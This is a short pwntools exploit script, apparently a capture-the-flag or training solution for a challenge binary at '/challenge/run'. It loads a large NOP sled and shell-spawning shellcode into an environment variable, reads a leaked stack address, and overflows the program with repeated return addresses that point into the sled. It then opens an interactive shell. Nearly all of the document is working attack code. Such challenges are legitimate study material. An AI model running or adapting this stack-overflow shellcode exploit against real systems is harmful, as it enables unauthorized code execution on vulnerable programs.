#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/run
import os
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/run')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

# NOP sled with comfortable room for error
sled_len = 0x5000
nop_sled = b"\x90" * sled_len

shellcode = asm(shellcraft.sh())

payload = nop_sled + shellcode

io = start(["testing"], env={"SHELLCODE_CMD": payload})

io.recvuntil(b"for you: ")
rsp_line = io.recvline()[:-1]
rsp_hex = int(rsp_line, 16)
print("Received rsp address:", rsp_line)

target_shellcode_sled = rsp_hex + sled_len

final_payload = p64(target_shellcode_sled) * 0x34 # why does normal padding not work here?

io.sendline(final_payload)

io.interactive()
